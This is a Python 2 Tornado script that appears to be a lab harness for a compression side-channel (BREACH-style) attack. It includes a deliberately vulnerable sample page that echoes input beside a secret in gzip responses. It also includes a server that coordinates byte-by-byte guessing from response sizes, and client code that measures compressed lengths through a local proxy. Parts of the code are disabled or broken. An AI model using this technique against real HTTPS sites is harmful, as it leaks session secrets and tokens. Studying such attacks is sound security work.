from StringIO import StringIO
import gzip
import urllib2
import string
import heapq
import json

#server stuff
import tornado.httpserver
import tornado.ioloop
import tornado.web
import tornado.options
import logging

logging.getLogger().setLevel(logging.INFO)



#goals
#STATELESS
#client needs to request 
#/?val=SecretVal=a
#/?val=SecretVal=b

#client gets new token with /?fullstate=

#Server only needs to guide next steps (requires responses & dictionary)


#STATEFUL - File storage
#client gets first token with /next
#client needs to request   /?val=SecretVal=a
#tcprelay write to file ~/responsesize
#client gets new token with /next
#server reads responsesize and sets it to -1 adds it to dictionary of following format [(a,42),(b,43)]
#server responds with next value
#if out of values, server finds minimum and rebuilds dictionary (loops)


#IGNORE
#server tracks response lengths and temp dictionary for each request


#Client sends /?val=&tempDictionary=abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_
#Server responds a,

#todo = implement SSL
#rollback = rely on burp for 304


#rfc 2246 to blacklist CBC
#--cipher-suite-blacklist=0x000B,0x000C,0x000D,0x0011,0x0012,0x0013

#sample web application to hack
class MainHandler(tornado.web.RequestHandler):
	#def initialize(self, data):
	#	self.data = data

	def get(self):
        #self.write("secrettoken=cccccrime_pays")
		#self.user="test"
		#self.data += self.data
		#self.write("SecretVal=" + str(self.get_cookie("Auth")) + self.get_argument("val", default=""))
		self.write("SecretVal=" + "crimepays" + self.get_argument("val", default=""))
		#self.write("<html><input type='hidden' name=hiddentoken value='SecretVal=crimepays'><input type='text' name=search value='" + self.get_argument("val", default="") +"'></html>")

	def set_default_headers(self):
		self.set_header("Access-Control-Allow-Origin", "*")
		self.set_header("Cache-Control", "No-Cache")
		self.set_header("Expires", "Thu, 31 Jan 2010 14:51:51 GMT")

	def compute_etag(self):
		return None

class LoginHandler(tornado.web.RequestHandler):
	#def initialize(self, data):
	#	self.data = data
	def get(self):

		self.set_cookie("Auth", "CrimePays")



#provides client with next values
class NextHandler(tornado.web.RequestHandler):

	dictionary = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_"
	#dictionary = "abcdefg"
	tempdictionary = []
	prefix = ""
	alltimemin = -1
	responses = []

	#read file and 
	def getSize(self):
		try:
   			f = open('responsesize', 'r')
   			responseSize = f.readline()
			f.close()
			f = open('responsesize', 'w') #reset size
			f.write("-1")
			f.close()
			return responseSize
		except IOError:
			print "file responsesize does not exist"
			return 500
		

	def findminimum(self):
		minimum = []
		minimum = [self.responses[0][1]]
		minimumlen = self.responses[0][0]

		for r in self.responses[1:]: #dont redo the first one
			print "S:" + str(r[0])
			if r[0] < minimumlen:
				minimumlen = r[0]
				minimum = [r[1]]
			elif r[0] == minimumlen:
				minimum.append(r[1])

		print "MinLen: " + str(minimumlen)
		return (minimumlen, minimum)



	def builddictionary(self, minchars, dictionary):
		newdict = []

		for a in minchars:
			for d in dictionary:
				newdict.append(a + d)

		return newdict

	#returns next value to BF with
	def getNext(self, last):
		self.auto_etag = False

		#try:
		dIndex = self.tempdictionary.index(last)
		#logging.info(str(dIndex) + " -- " + str(len(self.dictionary)))
		if (dIndex < len(self.tempdictionary)-1):
			#self.write("AA" + ":" + str(len(self.tempdictionary)) + ":" + str(dIndex) + str(self.tempdictionary) + "   :" + self.tempdictionary[6])
			next = self.tempdictionary[dIndex+1]
		else: #handle end of tempdict
			#find minimum(s)
			#return JSON each time
			#JSON will track -prefix, tempdictionary, next
			#return Found:X if one found
			#if len(minimums) == 1:
			#	self.write("")

			#rebuild temp dictionary
			#find minimum
			minlength, minchars = self.findminimum()

			#if minlength is greater than all found so far, stop, answer found -- maybe if minimum less than all time minimum, stop
			if self.alltimemin == -1:
				self.alltimemin = minlength
			elif self.alltimemin < minlength:
				next = "QUIT"

			print "minchars: " + str(minchars)

			if len(minchars) == 1:
				prefix = minchars 
				f = open('responsesdict', 'w+') #creates and clears file
				f.write("")
				f.close()


			prefix = minchars 
			


			self.tempdictionary = self.builddictionary(minchars, self.dictionary)
			print "tempdict: " + str(self.tempdictionary)		
			self.responses = []

			next = self.tempdictionary[0]

		return next
		#except:
		#	print "couldnt get index for: " + last

	#returns next value to BF with
	def get(self):
		self.write(json.dumps( {'next': self.dictionary[0], 'prefix':"", 'tempdictionary':self.dictionary} ) )

	#returns next value to BF with
	def post(self):

		#logging.info('RECEIVED HTTP GET REQUEST')
		self.auto_etag = False
		

		req = json.loads(self.request.body)

		#c = self.get_argument("last", default="")
		#tempdictionary = self.get_argument("tempdictionary", default=self.dictionary)
		#prefix = self.get_argument("prefix", default=self.dictionary)

		#self.write(self.request.body)

		print "last:" + req['last']
		self.prefix = req['prefix']
		if req['tempdictionary'] != "":
			self.tempdictionary = req['tempdictionary']


		if req['last'] == "" or req['last'] == None:  #first request
			print "Creating Files"
			for a in self.dictionary:
				self.tempdictionary.append(a)

			self.write(json.dumps( {'next': self.dictionary[0], 'prefix':"", 'tempdictionary':self.tempdictionary} ) )
			f = open('responsesdict', 'w+') #creates and clears file
			f.write("")
			f.close()

			f = open('responsesize', 'w') #reset size
			f.write("-1")
			f.close()


		else: #read responses from file and unserialize 

			
			

			#if next == self.tempdictionary[0]:
			#	f = open('responsesdict', 'w+') #creates and clears file
			#	f.write("")
			#	f.close()
			#else:
			f = open('responsesdict', 'r+')
			obj = f.readline()
			print "appending to :" + str(self.responses)
			if obj != "":
				print "current:" + obj
				self.responses = json.loads(obj)

			f.close()
		
			#get latest response size and add it to responses dict
			f = open('responsesdict', 'w+')
			previous = self.tempdictionary[self.tempdictionary.index(req['last'])]

			print "previndex: "+ str(self.tempdictionary.index(req['last']))

			print "previous: " + previous

			self.responses.append([self.getSize(), previous])
			
			
			#self.responses.pop([0])
			next = self.getNext(req['last'])

			f.write(json.dumps(self.responses))
			f.close()

			#output result & call getnext
			self.write( json.dumps( {'next': next, 'prefix':self.prefix, 'tempdictionary':self.tempdictionary} ) )
			
			#logging.info('Returning: ' + self.getNext(req['last']))

	def set_default_headers(self):
		self.set_header("Access-Control-Allow-Origin", "*")




#data = "asdf"

class BreachSlave(tornado.web.RequestHandler):
	def get(self):

		f = open('BreachSlave.html', 'r+')

		obj = f.read()
		f.close()
		
		self.write(obj)


application = tornado.web.Application([
    (r"/", MainHandler),
    (r"/next", NextHandler),
    (r"/login", LoginHandler),
    #(r'/BreachSlave\.html', tornado.web.StaticFileHandler, {'path': 'BreachSlave.html'})
    (r'/BreachSlave\.html', BreachSlave)

], debug=True, gzip=True)

if __name__ == "__main__":
	f = open('responsesdict', 'w+') #creates and clears file
	f.write("")
	f.close()
	f = open('responsesize', 'w+') #creates and clears file
	f.write("")
	f.close()


	http_server = tornado.httpserver.HTTPServer(application,
		ssl_options={
		"certfile": "/root/crypto/compression/cert.pem",
		"keyfile": "/root/crypto/compression/key.pem",

	})

	#ssl
	http_server.listen(8888)
	tornado.ioloop.IOLoop.instance().start()

#	application.listen(8888)
#	tornado.ioloop.IOLoop.instance().start()
















#data format
#[(35, c), (35, e)]


#input all responses
#return all letters of minimum size
def findminimumold(responses):
	minimum = []
	minimum = [responses[0][1]]
	minimumlen = responses[0][0]

	for r in responses:
		if r[0] < minimumlen:
			minimumlen = r[0]
			minimum = [r[1]]
		elif r[0] == minimumlen:
			minimum.append(r[1])

	print "MinLen: " + str(minimumlen)
	return (minimumlen, minimum)

#input a URL to append to
#returns responses
def requestposition(url, targettext, dictionary):

	responses = []

	#request every letter
	for suffix in dictionary: 

		request = urllib2.Request(url + targettext + (suffix)*1)
		request.add_header('Accept-encoding', 'gzip')

		proxy = urllib2.ProxyHandler({'http': 'http://127.0.0.1:8080'})
		opener = urllib2.build_opener(proxy)
		urllib2.install_opener(opener)

					
		response = urllib2.urlopen(request)	
		if response.info().get('Content-Encoding') == 'gzip':
		    buf = StringIO( response.read())
		    f = gzip.GzipFile(fileobj=buf)
		    data = f.read()
		    #print "compressed length: " + str(buf.len) + " Attempt: " + suffix

		    responses.append([buf.len, suffix])

		else:
			print "uncompressed"

	return responses


def builddictionaryold(minchars, dictionary):
	
	newdict = []

	for a in minchars:
		for d in dictionary:
			newdict.append(a + d)

	return newdict


def main():

	print "THIS IS RUNNIING!"

	url = 'http://127.0.0.1:8888' + '?val='
	targettext = "SecretVal="
	dictionary = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_"
	tempdictionary = dictionary
	alltimemin = -1
	#end = False
	end = True
	while end == False:

		#get responses
		responses = requestposition(url , targettext, tempdictionary)

		#find minimum
		minlength, minchars = findminimum(responses)

		#if minlength is greater than all found so far, stop, answer found -- maybe if minimum less than all time minimum, stop
		if alltimemin == -1:
			alltimemin = minlength
		elif alltimemin < minlength:
			end = True

		print minchars

		#if one minimum, append it for next responses
		#if len(minchars) == 1:
		#	targettext.append(minchars[0])
		#else:
		tempdictionary = builddictionary(minchars, dictionary)

		#print tempdictionary

	print "Result: " + minchars[0][:-1]#+ '[%s]' % ', '.join(map(str, minchars))

	#if more than one minimum, generate new dictionary for next position with all combinations



#if __name__ == "__main__":
    #main()